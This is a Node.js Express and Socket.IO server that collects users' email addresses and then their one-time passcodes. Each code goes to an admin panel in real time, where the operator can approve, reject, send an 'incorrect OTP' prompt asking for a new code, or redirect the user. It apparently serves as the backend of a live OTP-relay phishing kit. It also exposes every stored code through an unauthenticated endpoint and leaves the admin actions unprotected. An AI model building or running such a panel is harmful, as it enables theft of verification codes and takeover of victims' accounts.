require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { Pool } = require('pg');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" }
});

// Middleware
app.use(express.json());
app.use(express.static('public'));

// ------------------- Neon PostgreSQL -------------------
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Auto-create users table if not exists
async function initDatabase() {
  const createTableQuery = `
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      email VARCHAR(255) UNIQUE NOT NULL,
      otp_code VARCHAR(10),
      status VARCHAR(50) DEFAULT 'pending',
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
  `;
  try {
    await pool.query(createTableQuery);
    console.log('✅ Database ready: users table exists');
  } catch (err) {
    console.error('❌ DB init error:', err.message);
  }
}
initDatabase();

// ------------------- Socket.IO -------------------
// Store user sockets: email -> socket.id
const userSockets = new Map();

io.on('connection', (socket) => {
  console.log('🟢 Client connected:', socket.id);

  socket.on('user-join', (email) => {
    userSockets.set(email, socket.id);
    socket.join(`user_${email}`);
    console.log(`📧 User ${email} joined room`);
  });

  socket.on('admin-join', () => {
    socket.join('admin_room');
    console.log('🔐 Admin joined');
  });

  socket.on('disconnect', () => {
    console.log('🔴 Client disconnected:', socket.id);
    // Remove from map (optional cleanup)
    for (let [email, id] of userSockets.entries()) {
      if (id === socket.id) userSockets.delete(email);
    }
  });
});

// Helper to emit to user
function emitToUser(email, event, data) {
  io.to(`user_${email}`).emit(event, data);
}

// ------------------- API Endpoints -------------------

// 1. Submit email (user side)
app.post('/api/submit-email', async (req, res) => {
  const { email } = req.body;
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Invalid email' });
  }

  try {
    // Check if user exists, if not create
    let result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
    let userId;

    if (result.rows.length === 0) {
      const insert = await pool.query(
        'INSERT INTO users (email, status) VALUES ($1, $2) RETURNING id',
        [email, 'pending']
      );
      userId = insert.rows[0].id;
    } else {
      userId = result.rows[0].id;
      // Reset status to pending for this session
      await pool.query('UPDATE users SET status = $1, otp_code = NULL WHERE email = $2', ['pending', email]);
    }

    // Notify admin room about new email (real-time)
    io.to('admin_room').emit('new-email', { email, userId, timestamp: new Date() });

    res.json({ success: true, userId });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error' });
  }
});

// 2. Submit OTP (user side)
app.post('/api/submit-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) return res.status(400).json({ error: 'Missing data' });

  try {
    await pool.query(
      'UPDATE users SET otp_code = $1, status = $2 WHERE email = $3',
      [otp, 'otp_submitted', email]
    );

    // Notify admin about OTP submission
    io.to('admin_room').emit('new-otp', { email, otp, timestamp: new Date() });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error' });
  }
});

// 3. Get all users (for admin panel)
app.get('/api/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, email, otp_code, status, created_at FROM users ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 4. Admin login check
app.post('/api/admin/check', (req, res) => {
  const { email, password } = req.body;
  const adminEmail = process.env.ADMIN_EMAIL;
  const adminPass = process.env.ADMIN_PASSWORD;
  if (email === adminEmail && password === adminPass) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

// 5. Admin actions
app.post('/api/admin/approve', async (req, res) => {
  const { email } = req.body;
  try {
    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['approved', email]);
    emitToUser(email, 'approve-user', { email });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/reject', async (req, res) => {
  const { email } = req.body;
  try {
    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['rejected', email]);
    emitToUser(email, 'reject-user', { email });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/incorrect-otp', async (req, res) => {
  const { email } = req.body;
  try {
    emitToUser(email, 'incorrect-otp', { email });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/redirect', async (req, res) => {
  const { email } = req.body;
  try {
    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['redirected', email]);
    emitToUser(email, 'redirect-to-sad', { email });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Serve sound files (optional, ensure they exist in public/sounds/)
app.get('/sounds/:filename', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'sounds', req.params.filename);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).json({ error: 'Sound not found' });
  }
});

// Catch-all to serve index.html for any unknown routes (SPA)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ------------------- Start Server -------------------
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 User interface: http://localhost:${PORT}`);
  console.log(`👑 Admin panel: http://localhost:${PORT}/admin.html`);
});